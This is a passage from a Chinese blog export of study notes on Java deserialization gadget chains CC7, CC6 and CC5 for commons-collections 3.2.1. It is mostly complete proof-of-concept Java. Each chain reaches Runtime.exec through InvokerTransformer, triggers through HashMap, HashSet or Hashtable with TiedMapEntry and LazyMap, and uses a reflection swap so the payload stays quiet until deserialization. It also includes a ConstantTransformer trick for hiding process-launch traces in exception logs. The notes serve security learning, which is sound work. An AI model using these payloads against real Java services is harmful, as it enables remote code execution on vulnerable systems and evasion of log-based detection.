out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机。\n后面再看发现其实其中有一个点是没有说清楚的，确实在序列化之前是可以成功调用到LazyMap的get()方法，但是对于是否会替换这个问题没有说清楚，也就是对应如下代码：\n在序列化前，这里到底为什么不更换值。前面从构建的代码层面简单说了一下利用方法。现在POC也给出来了，就跟一下底层来查看一下：\n直接打断点于AbstractMap类的equals()方法：\n这里就是期望执行get()方法的地方，由于现在是序列化前，经过代码的构造，不会弹计算机，跟进一下这里会执行的LazyMap类的get()方法：\n由于我们构造的transform执行结果就，是返回一个1，并且最后返回的这个value，所以 m.get(key) 就是返回一个1，也是因为在这里往hashMap1中放进了一个键值对，为了反序列化时能通过hash值相同，所以后面加了一个remove操作。\n继续看：\n所以现在比较的就是value和1的相等关系，而这里的value是2：\n其实从代码层面也能看出来，本来最开始就是put的yy =\u0026gt; 2，这里是肯定不相等的，所以取反后就是true了，true返回了false，所以最后才没有换值。\n这样也能解决为什么前面说的only1就不行了，如果我put进的是1，那么这里就会与transform返回的1相等，最后就会返回true。\n那么我就是要用1呢，如下一个操作就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package java_foundation; import java.util.HashMap; import java.lang.reflect.Field; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import javax.management.BadAttributeValueExpException; import java.lang.Class; import javax.xml.transform.Templates; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import java.util.HashSet; import java.util.Hashtable; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.nio.file.Files; import java.nio.file.Paths; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(2)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); hashMap0.put(\u0026#34;yy\u0026#34;,1); Map lazy0 = LazyMap.decorate(hashMap0,chain); Map hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,1); Map lazy1 = LazyMap.decorate(hashMap1,chain); hashtable.put(lazy0,1); hashtable.put(lazy1,1); hashMap1.remove(\u0026#34;yy\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 重点还是代码的理解。\n问题：\n不加键值对直接到size()问题 哈希碰撞问题 为什么对LazyMap使用put时的键值对的值需要相同，可能是内部类Node那里的hashCode方法原因。 ","date":"2025-01-22T14:00:24+08:00","permalink":"https://fupanc-w1n.github.io/p/cc7/","title":"CC7"},{"content":"CC6 在CC1已经说过了，在JDK 8u71以后，官方修改了AnnotationInvocationHandler的readObject()方法，导致CC1不能再利用。\n所以现在需要找寻新的利用链用于解决高版本Java的问题，现在先来看这个利用链。\n测试环境\nJDK 8u411 commons-collections 3.2.1 代码调试 在前面的CC1的LazyMap链中利用的就是get()方法，那么现在其实还可以寻找在上下文中是否还有其他调用LazyMap#get()的类，并且要求这个可利用的类实现了Serializable接口。 在这里找到的类是org.apache.commons.collections.keyvalue.TiedMapEntry，重点就是下面的两个方法，分别是：\n1 2 3 4 5 6 7 8 9 //getValue() public Object getValue() { return this.map.get(this.key); } //hashCode() public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } 在这里可以看到在hashCode()方法中调用了getValue()方法，在getValue()方法中的this.map.get(this.key);，只要这里可以将this.map的值设置为LazyMap的实例，就又可以成为一个利用链的起始点。\n所以现在需要先找到可以使用什么类来触发TiedMapEntry#hashCode()方法，在这里，同样的有两条链子，分别是HashMap和HashSet\n利用HashMap 利用链代码审计 此时我想到了URLDNS链，其中有一个步骤调用了hashCode()方法，如下： 这里就是调用的key的hashCode方法，在URLDNS中的这个key对应的是URL类实例，所以URLDNS中调用的是URL类的hashCode()方法，那么现在其实也比较简单了，先大概想一下流程：\n这里肯定是用HashMap作为序列化以及反序列化的对象 很简单了，然后在反序的时候自然会到hash()方法，此时我们需要在要序列化的代码中put进一个key为TiedMapEntry类的实例，让这个key等于TiedMapEntry对象，这样就会顺利调用到TiedMapEntry类的hashCode()方法，然后再将TiedMapEntry类里面的map设置为LazyMap类的实例，这样就会成功调用到LazyMap类的get方法，后面就是CC1中提过的了。 流程基本清楚，现在就是如何设计代码了\n然后就是看如何传入基本盘了，基本盘如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //基本盘 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Retention.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); } } 现在就是需要将这个基本盘传入TiedMapEntry类，看一下这个类的构造方法：\n都是public，那么直接引入即可，所以这里的利用代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map lazy = LazyMap.decorate(null,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 报错显示在实例化LazyMap那里不能传入null，\n那么我就再创一个HashMap实例进去赋值，那么测试代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 运行结果如下：\n虽然成功弹出计算机，本来也以为只是平常的报错，然后去看了一下其他文章，发现是自己的代码有问题，首先就是在hashMap.put()，本身的put()方法就是与HashMap#readObject()的部分源码相同：\n这样在put时就会触发一次利用链，这也是为什么会弹出计算机的原因（后面会说这个的解决方法）。\n再来看这个报错内容：\n这个报错内容显示我在序列化过程中试图序列化一个不可序列化的exec执行后返回的Process对象，然后前面的CC1却没有报这样的错，这里就看看差别(个人理解，仅供参考)：\n对于前面的错误代码：首先就是我们new了一个HashMap实例，然后我们往里面put进了一个TiedMapEntry类实例，而在序列化HashMap时，会遍历 HashMap 中的每个 Map.Entry 对象（即键值对），并序列化每个键值对，而对于每个 Map.Entry，ObjectOutputStream 会调用它们的 getKey() 和 getValue() 方法来获取键和值，以便对它们进行序列化，然后ObjectOutputStream的writeObject方法就会尝试去序列化。\n然后由于我们设置的值，传入了TiedMapEntry类实例，在调用getValue()后会进入LazyMap的get()方法从而导致整条利用链的进行，然后Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)，这个调用会尝试启动一个新进程，返回一个不可序列化的 Process 对象。用一个代码测试一下是否会遍历：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.Runtime; import java.util.HashMap; import java.io.Serializable; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main implements Serializable { public static void main(String args[]) throws Exception { HashMap o = new HashMap(); Runtime x = Runtime.getRuntime(); o.put(x,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } } 运行结果： 说明确实在HashMap序列化的时候会遍历条目并调用writeObject()方法对其进行序列化，如果要序列化的对象没有定义writeObject()方法，就会调用默认的writeObject()方法去序列化它（对于默认个人理解应该是ObjectOutputStream的writeObject方法）。\n结合前面的解释，那么就是由于调用了TiedMapEntry的getValue()方法，然后进行链式反应，最终会返回一个Process对象作为这个\u0026quot;value\u0026quot;，但是由于这个对象是不可被序列化的，所以最终会报错不可被序列化。\n那么对于CC1中的LazyMap链：那里通过使用 AnnotationInvocationHandler 代理包装 LazyMap，避免在序列化过程中触发变换器链，避免了异常。 ——————\n那么对于这个问题的解决方法，ysoserial早在CC1中就有了优化： 它这里是最后才将恶意transformers数组设置到transformerChain中，解决问题的方法就在这里。\n同时注意看基本盘代码里面，添加了一个ConstantTransformer(1)，这是为了隐藏异常日志中的信息，起到了隐蔽启动进程的日志特征的作用。以CC1为例看一下使用过后的差别： 使用前的特征：\n使用后的特征：\n使用后同样成功弹出计算机，但是这里的异常日志特征已经被改变了。\n解决方法就在里面，所以我们可以在利用链的最后加上一个new ConstantTransformer(1)，熟悉这个类的transformer()方法就可以知道，这里不会管传入的input，这里就会直接返回一个1，再结合正常的例如put(1,\u0026quot;xxx\u0026quot;)这种，这样在序列化时就不会报无法序列化的错误，同时也可以起到隐藏日志的作用。\n所以修改后的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 没有报错，但是还是没有成功反序列化，否则应该会弹出两个计算机。\n调试一下，加断点如下： 在调试过程中发现如下情况\n也就是这里的if条件并没有通过，还显示一个null，就是因为我在传初始化TiedMapEntry时将key设置为了null，而调用get()方法的逻辑是将key传进去了的：\n这也是为什么在LazyMap的get()方法中显示的是null。\n所以需要改一下POC，这里直接将key设置成一个可见字符就行了，具体看后面的代码。\n同时解决一个问题：在序列化之前调用put()时会弹出计算机的问题 思路：可以先传入一个假的“链”，在put过后再调用反射将这个利用链传回去。\n看这个ChainedTransformer的利用的变量： 也就是这个iTransformers变量，所以我们可以这样干，看代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //先定义一个假的transformer Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; //再声明一个利用链 Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; //先传入假的transformer Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); //在put过后，在序列化之前，调用反射将假的链换成真的chainpart Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); //然后再进行序列化 整合进全部代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功不再弹出由于put而引起的计算机，但是反序列化化石灭有弹出计算机。\n那么为什么没有反序列化成功弹出计算机？同样调试，发现：\n这里的key是fupanc，也就是我们在实例化时TiedMapEntry传入的\u0026quot;fupanc\u0026quot;，对于这里的key为fupanc很正常\n但是这里的get()方法的if条件没有通过的原因，也就是说明有对象中有fupanc这个键，那么为什么会出现这个现象呢，看代码\n原因就是这个，put方法追溯源码后也会调用hashCode()方法，但是我们这里传入了TiedMapEntry类对象的outerMap，所以这里也会进入到LazyMap#get()，剩下重点看get()方法的源码： 我们第一次确实是没有key为fupanc的键值对，但是看get()方法的源码，在进入if条件后，这里经过transform方法返回value，在if语句的最后调用了this.map.put(key,value); 也就是调用了HashMap的put方法并传入了一个key为fupanc，value为1的键值对（Key=fupanc，Value=1），所以我们在反序列化的时候会因为对象中有这个键为fupanc的键值对而失败。\n解决方法：很简单，在调用put方法后，我们再调用remove方法来删掉这个键值对即可（一定要注意键值对所属对象的问题）。\n那么最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机：\n问题总结 总结前面的问题：\n无法序列化Process对象问题 序列化之前弹计算机的解决方法 需要remove的原因。 利用HashSet链 ysoserial链介绍了java.util.HashSet作为反序列化的入口，在HashSet类的readObject()方法的最后，会触发map.put方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Consume and ignore stream fields (currently zero). s.readFields(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Clamp load factor to range of 0.25...4.0. loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f); // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT); } } 重点就是最后的for循环： 这里的map同样是一个HashMap对象，HashSet类初始化时基本都是将map设置为一个初始化的HashMap类：\n等构造方法。\n而HashMap.put方法前面也说过，源码放过来一下：\n所以然后调用hash() ==\u0026gt; hashCode() ==\u0026gt; getValue() ==\u0026gt; get() ==\u0026gt; transform()也就是我们已经熟悉的操作了。\n所以在前面的HashSet#readObject()中的e需要为TiedMapEntrry类实例\n来稍微看一下HashSet类的变量：\n这里直接说明了PRESENT的值为Object类的实例。并且注意看HashSet类的构造方法，基本上都是直接将map定义为HashMap类的实例。所以这里在利用HaseSet类时直接放心将map直接当做HashMap对象即可。\n同时在HashSet中提供了一个add方法： 这个方法的作用就是向 HashSet 中添加一个元素。如果该元素已经存在于 HashSet 中，那么不会添加，并且返回 false。否则，会将该元素添加到 HashSet 中，并返回 true。\n测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashSet; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); } } /*output: true true false 调试一下，在true部分加断点： 进入add()方法源码\n随后确实进入了put方法，：\n同时跟一下源码，确实进行了在HashMap中的put操作。为了方便理解这里的返回true和false的区别，还是用代码来说明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.util.HashSet; import java.util.HashMap; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); // HashMap hashMap = new HashMap(); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); } } /*output: true true false null xxxx 也就是在HashMap的put方法中，如果没有键则会成功放入键值对并返回null，否则就会返回键对应的值。\n现在对于前面的add方法返回的布尔值就很好理解了：\n因为成功put进了fupan键和haha键，所以返回null，与add方法中定义的map.put(e, PRESENT)==null等号成立，返回ture，表明成功放入键值对， 而由于前面已经put进了fupanc键，导致再次调用put添加fupanc键返回的是前面定义的fupanc键的value，在这里也就是Object类的实例，但这样并不与null相同，所以返回的是false，表明并没有成功放入键值对 现在也就基本通了，结合前面的HashMap的理解，可以直接编写下面的POC来测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashSet); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 运行后成功弹出计算机：\n需要注意的地方和前面HashMap利用链差不多，说到底这个HashSet也就是间接调用HashMap的put方法，本质是一样的。\n好处 这两个利⽤链可以在Java 7和8的⾼版本触发，应该是通杀Java7、8版本的。\n","date":"2025-01-22T13:58:13+08:00","permalink":"https://fupanc-w1n.github.io/p/cc6/","title":"CC6"},{"content":"CC5 在前面CC6的学习中，我们在找LazyMap.get()的其他调用链时，找到了org.apache.commons.collections.keyvalue.TiedMapEntry类，在CC6中，我们着重于调用TiedMapEntry类hashCode()方法从而可以调用到getValue()方法：\n但是纵观TiedMapEntry类的源码，还可以看到一个toString()方法：\n这个类也可以调用到TiedMapEntry类的getValue()方法，现在就是看是否还有哪个类可以调用到这个方法，也就是CC5要解决的问题。\n测试环境：\nJDK 8u411 commons-collections 3.2.1 